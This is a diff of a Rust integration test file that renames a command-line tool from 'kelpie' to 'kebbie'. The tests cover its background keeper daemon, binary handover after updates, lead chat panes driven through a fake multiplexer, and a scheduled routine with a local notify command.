     assert!(git(&app, &["branch", "--list", "billing"]).is_empty());
     assert!(gh_calls(&lab).iter().any(|call| call.starts_with("run list -R acme/app --branch main --event push")), "{:?}", gh_calls(&lab));
     let _ = slot;
@@ -1085,17 +1085,17 @@ fn eventually(mut done: impl FnMut() -> bool) -> bool {
 #[test]
 fn one_keeper_starts_detached_shows_its_routines_and_stops() {
     let lab = Lab::new("keeper");
-    assert!(stdout(&lab.run(&["keeper", "--status"])).starts_with("keeper: not running; kelpie keeper --start starts it"));
+    assert!(stdout(&lab.run(&["keeper", "--status"])).starts_with("keeper: not running; kebbie keeper --start starts it"));
     let started = stdout(&lab.run(&["keeper", "--start"]));
     assert!(started.starts_with("keeper: started (pid "), "{started}");
     let pid = pid_in(&started);
-    assert!(alive(&pid), "the keeper outlives the kelpie that started it");
+    assert!(alive(&pid), "the keeper outlives the kebbie that started it");
     assert_eq!(stdout(&lab.run(&["keeper", "--start"])), format!("keeper: already running (pid {pid})"));
     assert_eq!(stdout(&lab.run(&["keeper"])), format!("keeper: already running (pid {pid})"), "a second keeper never runs beside the first");
     assert!(eventually(|| stdout(&lab.run(&["keeper", "--status"])).contains("  restart   every 1m   last ")), "{}", stdout(&lab.run(&["keeper", "--status"])));
     let status = stdout(&lab.run(&["keeper", "--status"]));
     assert!(status.starts_with(&format!("keeper: running, pid {pid}, up ")), "{status}");
-    assert!(status.contains(&format!("binary: {}", Path::new(KELPIE).canonicalize().unwrap().display())) && status.contains("  messages  every 3s   last "), "{status}");
+    assert!(status.contains(&format!("binary: {}", Path::new(KEBBIE).canonicalize().unwrap().display())) && status.contains("  messages  every 3s   last "), "{status}");
     let doctor = stdout(&lab.run(&["doctor"]));
     assert!(doctor.lines().any(|line| line.starts_with("ok") && line.split_whitespace().nth(1) == Some("keeper") && line.contains(&format!("running, pid {pid}, up "))), "{doctor}");
     let calls = lab.herdr_calls();
@@ -1105,14 +1105,14 @@ fn one_keeper_starts_detached_shows_its_routines_and_stops() {
     assert!(eventually(|| !alive(&pid)), "stopped means gone");
     assert!(stdout(&lab.run(&["keeper", "--status"])).starts_with("keeper: not running"));
     let log = fs::read_to_string(lab.state.join("keeper.log")).unwrap();
-    assert!(log.contains(&format!("started: pid {pid}, kelpie ")) && log.contains("exits: stopped"), "{log}");
+    assert!(log.contains(&format!("started: pid {pid}, kebbie ")) && log.contains("exits: stopped"), "{log}");
 }
 
 #[test]
 fn a_keeper_a_test_leaves_running_is_gone_when_the_test_ends() {
     let lab = Lab::new("keeper-left");
     let elsewhere = lab.root.join("another-state");
-    let started = stdout(&lab.command().env("KELPIE_STATE_DIR", &elsewhere).args(["keeper", "--start"]).output().unwrap());
+    let started = stdout(&lab.command().env("KEBBIE_STATE_DIR", &elsewhere).args(["keeper", "--start"]).output().unwrap());
     let pid = pid_in(&started);
     assert!(alive(&pid), "{started}");
     drop(lab);
@@ -1128,7 +1128,7 @@ fn an_update_restarts_the_keeper_on_the_new_binary_and_off_starts_none() {
     let old = pid_in(&started);
     let second = stderr(&lab.run(&["update", "--finish"]));
     let restarted = second.lines().last().unwrap_or_default().to_string();
-    assert!(restarted.starts_with("keeper: restarted on the new kelpie (pid "), "{second}");
+    assert!(restarted.starts_with("keeper: restarted on the new kebbie (pid "), "{second}");
     let new = pid_in(&restarted);
     assert!(new != old && !alive(&old) && alive(&new), "{old} → {new}");
     fs::write(&lab.config, "[keeper]\nenabled = false\n").unwrap();
@@ -1142,23 +1142,23 @@ fn an_update_restarts_the_keeper_on_the_new_binary_and_off_starts_none() {
 #[test]
 fn a_keeper_whose_binary_is_replaced_hands_over_to_the_new_one() {
     let lab = Lab::new("keeper-binary");
-    let binary = lab.root.join("install/target/release/kelpie");
+    let binary = lab.root.join("install/target/release/kebbie");
     fs::create_dir_all(binary.parent().unwrap()).unwrap();
-    crate::executable::write(&binary, fs::read(KELPIE).unwrap()).unwrap();
+    crate::executable::write(&binary, fs::read(KEBBIE).unwrap()).unwrap();
     let mut start = Command::new(&binary);
     start.env_clear().envs(lab.command().get_envs().filter_map(|(key, value)| Some((key, value?)))).args(["keeper", "--start"]).stdin(Stdio::null());
     let own = stdout(&start.output().unwrap());
     assert!(own.starts_with("keeper: started (pid "), "{own}");
     let old = pid_in(&own);
-    let fresh = binary.with_file_name("kelpie.new");
-    crate::executable::write(&fresh, fs::read(KELPIE).unwrap()).unwrap();
+    let fresh = binary.with_file_name("kebbie.new");
+    crate::executable::write(&fresh, fs::read(KEBBIE).unwrap()).unwrap();
     fs::rename(&fresh, &binary).unwrap();
     assert!(eventually(|| !alive(&old)), "the old keeper exits once the new binary holds still");
     assert!(eventually(|| stdout(&lab.run(&["keeper", "--status"])).starts_with("keeper: running")), "and a keeper on the new one runs");
     let status = stdout(&lab.run(&["keeper", "--status"]));
     assert!(!status.contains(&format!("pid {old},")) && status.contains(&format!("binary: {}", binary.canonicalize().unwrap().display())), "{status}");
     let log = fs::read_to_string(lab.state.join("keeper.log")).unwrap();
-    assert!(log.contains("exits: a new kelpie binary is in place") && log.contains("handed over to pid "), "{log}");
+    assert!(log.contains("exits: a new kebbie binary is in place") && log.contains("handed over to pid "), "{log}");
 }
 
 // The lead Space as the fake herdr shows it: the board on the left (p1), the lead's chat on the right (p2), both running.
@@ -1169,7 +1169,7 @@ fn lead_space(lab: &Lab, in_lead: bool, zoomed: bool, focused: &str) {
     let pane = |id: &str| format!(r#"{{"pane_id":"{id}","focused":{}}}"#, in_lead && id == focused);
     fs::write(answers.join("pane-list.json"), format!(r#"{{"result":{{"panes":[{},{}]}}}}"#, pane("w_lead:p1"), pane("w_lead:p2"))).unwrap();
     fs::write(answers.join("pane-layout.json"), format!(r#"{{"result":{{"layout":{{"zoomed":{zoomed},"focused_pane_id":"{focused}","panes":[{{"pane_id":"w_lead:p1","rect":{{"x":0,"y":0}}}},{{"pane_id":"w_lead:p2","rect":{{"x":64,"y":0}}}}]}}}}}}"#)).unwrap();
-    fs::write(answers.join("pane-process-info.json"), r#"{"result":{"process_info":{"shell_pid":1,"foreground_processes":[{"pid":2,"argv":["/opt/kelpie","board"]}]}}}"#).unwrap();
+    fs::write(answers.join("pane-process-info.json"), r#"{"result":{"process_info":{"shell_pid":1,"foreground_processes":[{"pid":2,"argv":["/opt/kebbie","board"]}]}}}"#).unwrap();
     for ok in ["pane-zoom", "pane-focus"] {
         fs::write(answers.join(format!("{ok}.json")), r#"{"result":{}}"#).unwrap();
     }
@@ -1217,7 +1217,7 @@ fn tab_with_the_chat_hidden_shows_it_and_focuses_it_and_back_keeps_it_shown() {
 }
 
 #[test]
-fn kelpie_lead_leaves_a_hidden_chat_hidden_and_starts_no_second_one() {
+fn kebbie_lead_leaves_a_hidden_chat_hidden_and_starts_no_second_one() {
     let lab = Lab::new("lead-hidden");
     lead_space(&lab, false, true, "w_lead:p1");
     let lead = lab.run(&["lead"]);
@@ -1247,7 +1247,7 @@ fn a_lead_restart_puts_the_chat_panes_shell_in_the_leads_folder_before_claude_st
     fs::create_dir_all(claude.join("projects/-Users-ada")).unwrap();
     fs::write(claude.join("projects/-Users-ada/9f1c2d3e-0000-4000-8000-000000000001.jsonl"), "{}\n").unwrap();
     fs::write(lab.state.join("lead-session"), "9f1c2d3e-0000-4000-8000-000000000001\n").unwrap();
-    let restarted = lab.command().env("KELPIE_LEAD_DIR", &dir).env("CLAUDE_CONFIG_DIR", &claude).args(["lead", "--restart"]).output().unwrap();
+    let restarted = lab.command().env("KEBBIE_LEAD_DIR", &dir).env("CLAUDE_CONFIG_DIR", &claude).args(["lead", "--restart"]).output().unwrap();
     assert!(restarted.status.success(), "{}", stderr(&restarted));
     assert_eq!(stdout(&restarted), "Restarted the lead with its current role and settings, resuming its conversation, started before the lead had its own folder.");
     let calls = changes(&lab);
@@ -1258,10 +1258,10 @@ fn a_lead_restart_puts_the_chat_panes_shell_in_the_leads_folder_before_claude_st
 }
 
 #[test]
-fn kelpie_lead_starts_a_quit_chat_again_in_the_leads_folder() {
+fn kebbie_lead_starts_a_quit_chat_again_in_the_leads_folder() {
     let lab = Lab::new("lead-repair-dir");
     let (dir, claude) = lead_at_shell(&lab, false);
-    let lead = lab.command().env("KELPIE_LEAD_DIR", &dir).env("CLAUDE_CONFIG_DIR", &claude).args(["lead"]).output().unwrap();
+    let lead = lab.command().env("KEBBIE_LEAD_DIR", &dir).env("CLAUDE_CONFIG_DIR", &claude).args(["lead"]).output().unwrap();
     assert!(lead.status.success(), "{}", stderr(&lead));
     let calls = changes(&lab);
     let cd = position(&calls, &["pane", "run", "w_lead:p2", &format!("cd '{}'\\''s dir'", lab.root.join("lead").display())]);
@@ -1280,7 +1280,7 @@ fn herdrs_startup_starts_the_board_in_a_restored_lead_space_and_leaves_the_chat_
     let started = changes(&lab);
     assert_eq!(started.len(), 1, "{started:?}");
     assert_eq!(started[0][..3], ["pane", "run", "w_lead:p1"]);
-    assert!(started[0][3].ends_with("kelpie' board"), "{started:?}");
+    assert!(started[0][3].ends_with("kebbie' board"), "{started:?}");
     assert!(!lab.herdr_calls().iter().any(|call| call.iter().any(|arg| arg == "w_lead:p2")), "herdr resumes the lead's Claude itself; the chat pane is never looked at");
 
     lead_space(&lab, false, false, "w_lead:p1");
@@ -1301,7 +1301,7 @@ fn a_due_routine_starts_as_a_task_in_the_keeper_round_reports_its_findings_and_c
     let (app, slot) = lab.task_fixture();
     let notified = lab.root.join("notified");
     fs::write(&lab.config, format!(
-        "[notify]\ncommand = 'printf \"%s %s\\n\" \"$KELPIE_EVENT\" \"$1\" >> {}'\n\n[[routines]]\nid = \"cluster-health\"\ntitle = \"Cluster health\"\nrepo = \"{}\"\nevery = \"1h\"\nprompt = \"Check that every node is Ready.\"\nmode = \"fix\"\npush = true\n",
+        "[notify]\ncommand = 'printf \"%s %s\\n\" \"$KEBBIE_EVENT\" \"$1\" >> {}'\n\n[[routines]]\nid = \"cluster-health\"\ntitle = \"Cluster health\"\nrepo = \"{}\"\nevery = \"1h\"\nprompt = \"Check that every node is Ready.\"\nmode = \"fix\"\npush = true\n",
         notified.display(), app.display(),
     )).unwrap();
     let answers = lab.root.join("answers");
